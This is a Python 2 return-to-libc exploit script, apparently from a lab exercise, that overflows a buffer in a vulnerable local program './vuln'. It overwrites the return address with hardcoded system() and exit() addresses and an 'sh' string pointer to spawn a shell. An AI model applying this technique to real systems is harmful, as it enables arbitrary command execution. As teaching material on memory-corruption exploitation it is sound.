#exp.py
#!/usr/bin/env python
import struct
from subprocess import call

#Since ALSR is disabled, libc base address would remain constant and hence we can easily find the function address we want by adding the offset to it. 
#For example system address = libc base address + system offset
#where 
       #libc base address = 0xb7e22000 (Constant address, it can also be obtained from cat /proc/<pid>/maps)
       #system offset     = 0x0003f060 (obtained from "readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system")

system = 0xb7e61060        #0xb7e2000+0x0003f060
exit = 0xb7e54be0          #0xb7e2000+0x00032be0

#system_arg points to 'sh' substring of 'fflush' string. 
#This is the reason for adding fflush(stdout) in vuln.c, since to spawn a shell, system argument should be 'sh'. If there is no 'sh' string in the binary, we cant spawn a shell. 
system_arg = 0x804827d                 #(obtained from hexdump output of the binary)

#endianess conversion
def conv(num):
 return struct.pack("<I",num)

# Junk + system + exit + system_arg
buf = "A" * 268
buf += conv(system)
buf += conv(exit)
buf += conv(system_arg)

print "Calling vulnerable program"
call(["./vuln", buf])
